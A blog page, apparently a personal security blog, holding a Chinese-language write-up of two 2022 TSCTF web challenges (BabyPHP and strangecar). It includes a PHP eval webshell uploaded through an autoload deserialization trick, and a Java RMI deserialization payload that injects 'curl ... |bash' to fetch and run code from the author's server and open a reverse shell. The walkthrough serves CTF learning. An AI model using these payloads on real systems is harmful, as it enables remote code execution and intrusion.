@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="1.BabyPHP文件泄露www.zip下载得到源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022TSCTF">
+<meta property="og:url" content="https://ka1t4v.github.io/2022/05/20/TSCTF_WP/index.html">
+<meta property="og:site_name" content="Ka1t4v">
+<meta property="og:description" content="1.BabyPHP文件泄露www.zip下载得到源码">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000406186.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000513030.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000709005.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000836714.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220424235725385.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425002025166.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425105745648.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111336018.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425105604375.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425110200788.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425113929873.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111517919.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111633140.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425113502600.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425114046584.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425114304081.png">
+<meta property="article:published_time" content="2022-05-20T05:23:20.000Z">
+<meta property="article:modified_time" content="2022-08-02T10:30:00.931Z">
+<meta property="article:author" content="Ka1t4v">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000406186.png">
+
+<link rel="canonical" href="https://ka1t4v.github.io/2022/05/20/TSCTF_WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2022TSCTF | Ka1t4v</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ka1t4v</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ka1t4v.github.io/2022/05/20/TSCTF_WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+      <meta itemprop="name" content="Ka1t4v">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ka1t4v">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022TSCTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-05-20 13:23:20" itemprop="dateCreated datePublished" datetime="2022-05-20T13:23:20+08:00">2022-05-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index"><span itemprop="name">WP</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="1-BabyPHP"><a href="#1-BabyPHP" class="headerlink" title="1.BabyPHP"></a>1.BabyPHP</h1><p>文件泄露<a target="_blank" rel="noopener" href="http://www.zip下载得到源码/">www.zip下载得到源码</a></p>
+<span id="more"></span>
+
+<p>发现在upload.php中有一个输出覆盖的问题</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000406186.png" alt="image-20220425000406186"></p>
+<p>如果上传文件名中包含%s字符将会输出上传目录</p>
+<p>上传文件</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000513030.png" alt="image-20220425000513030"></p>
+<p>得到上传文件目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.7.2.146:8080/y0u_wi1l_n3v3r_f1nd</span><br></pre></td></tr></table></figure>
+
+<p>根据提示</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000709005.png" alt="image-20220425000709005"></p>
+<p>访问cat.php根据网页提示访问.cat.php.swp获取备份文件然后使用vim -r还原</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425000836714.png" alt="image-20220425000836714"></p>
+<p>审阅源码发现spl_autoload_register()方法</p>
+<p>没有指定参数的时候，会在反序列化时自动包含相应类名的.inc文件或.php文件</p>
+<p>那么inc文件没有在黑名单中可以上传利用，并且要求文件名和类名一致</p>
+<p>这里生成a.inc然后上传,文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">    class a&#123;</span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">         eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">       public function __destruct()&#123;</span><br><span class="line">         eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>filename为序列化后的字符串，正常时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=O:1:&quot;a&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里要求长度小于等于8并且过滤{}</p>
+<p>所以直接将后面{}删掉，同样会触发反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filenames=O:1:&quot;a&quot;:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220424235725385.png" alt="image-20220424235725385"></p>
+<p>最后getshell，蚁剑连接，根目录发现&#x2F;flag.txt</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425002025166.png" alt="image-20220425002025166"></p>
+<h1 id="2-strangecar"><a href="#2-strangecar" class="headerlink" title="2.strangecar"></a>2.strangecar</h1><p>关键点在利用服务器端的Checker类的exec方法，造成rce</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425105745648.png" alt="image-20220425105745648"></p>
+<p>并且Checker类重写了readObject方法，反序列化时自动执行其中的exec方法，那么只要向服务器中传入序列化后的Checker对象即可</p>
+<p>构造恶意Cherker类，payload为<code>||curl$&#123;IFS&#125;http://10.128.247.54:8888/get.html|bash</code></p>
+<p>即拼接后最终为</p>
+<p><code>sh -c url||curl$&#123;IFS&#125;http://10.128.247.54:8888/get.html|bash</code></p>
+<p>${IFS}：dash中会识别为空格，但在runtime.exec中会识别为字符从而不会截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//恶意Checker类</span><br><span class="line">Checker checker = new Checker(100);</span><br><span class="line">Field cmd = checker.getClass().getDeclaredField(&quot;api_url&quot;);</span><br><span class="line">cmd.setAccessible(true);</span><br><span class="line">cmd.set(checker,&quot;||curl$&#123;IFS&#125;http://10.128.247.54:8888/get.html|bash&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>本地vps开放8888端口，挂载get.html文件</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111336018.png" alt="image-20220425111336018"></p>
+<p>查看Server#reportStatus()方法限制传入类为Car类，是实现了Iserver接口的reportStatus()方法</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425105604375.png" alt="image-20220425105604375"></p>
+<p>这里想用reportStatus()传入Checker类，只需修改本地IServer接口定义</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425110200788.png" alt="image-20220425110200788"></p>
+<p>然后在服务器端会对函数hash进行验证，只需手动修改hash即可</p>
+<p>但是题目环境中</p>
+<p>虽然可以成功连接Registry服务器，并且获得远程Server类对象，但是无法直接执行其方法，也就无法传入Checker类</p>
+<p>最后发现无法执行的原因在于从Registry服务器获得Server类对象时，会返回服务器端地址和开放对象的端口，已知服务器端将Server类开放在5666端口，但最后返回的地址为0.0.0.0:5666，肯定无法访问到服务器</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425113929873.png" alt="image-20220425113929873"></p>
+<p>那么已知Registry和服务端在同一地址，只需修改0.0.0.0为正常ip即可访问</p>
+<p>写一个简单的demo，使用断点调试修改的方式，第一个断点在调用方法前，修改ip地址</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111517919.png" alt="image-20220425111517919"></p>
+<p>第二个断点在RemoteObjectInvocationHandler#invokeRemoteMethod()方法中，用来修改函数hash</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425111633140.png" alt="image-20220425111633140"></p>
+<p>然后本地开启nc监听</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425113502600.png" alt="image-20220425113502600"></p>
+<p>开始调试</p>
+<p>在第一个断点，修改ip 0.0.0.0为10.7.2.149</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425114046584.png" alt="image-20220425114046584"></p>
+<p>然后f9执行到下一个断点，修改函数hash</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220425114304081.png" alt="image-20220425114304081"></p>
+<p>f9继续执行，成功反弹shell</p>
+<p>最后根目录发现&#x2F;flag</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/10/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="Shiro反序列化漏洞">
+      <i class="fa fa-chevron-left"></i> Shiro反序列化漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/25/JAVA%E5%8F%8D%E5%BC%B9shell/" rel="next" title="JAVA反弹Shell">
+      JAVA反弹Shell <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-BabyPHP"><span class="nav-number">1.</span> <span class="nav-text">1.BabyPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-strangecar"><span class="nav-number">2.</span> <span class="nav-text">2.strangecar</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ka1t4v"
+      src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Ka1t4v</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ka1t4v" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ka1t4v" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ka1t4v@gmail.com" title="E-Mail → mailto:ka1t4v@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ka1t4v</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
